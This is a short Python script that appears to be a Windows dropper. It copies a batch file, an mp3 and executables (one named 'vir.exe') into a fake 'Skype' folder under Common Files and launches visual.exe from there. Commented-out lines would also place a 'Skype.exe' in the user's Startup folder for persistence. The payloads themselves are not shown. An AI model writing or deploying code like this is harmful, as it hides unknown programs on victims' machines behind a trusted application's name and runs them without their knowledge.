import os

os.chdir('C:/Program Files (x86)/Common Files')
if not os.path.isdir('Skype'):
    os.mkdir('Skype')
os.chdir('C:/Users/Администратор/Desktop/antivirus')
#os.replace('vir.exe', 'C:/Program Files (x86)/Common Files/Skype/vir.exe')
#os.replace('visual.exe', 'C:/Program Files (x86)/Common Files/Skype/visual.exe')
#os.replace('Skype.exe', 'C:/Users/Администратор/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Skype.exe')
os.chdir('C:/Users/Администратор/Desktop/antivirus')
os.replace('ura.bat', 'C:/Program Files (x86)/Common Files/Skype/ura.bat')
os.chdir('C:/Program Files (x86)/Common Files/Skype')
os.mkdir('music')
os.chdir('C:/Users/Администратор/Desktop/antivirus')
os.replace('ogurez.mp3', 'C:/Program Files (x86)/Common Files/Skype/music/ogurez.mp3')
os.startfile('C:/Program Files (x86)/Common Files/Skype/visual.exe')


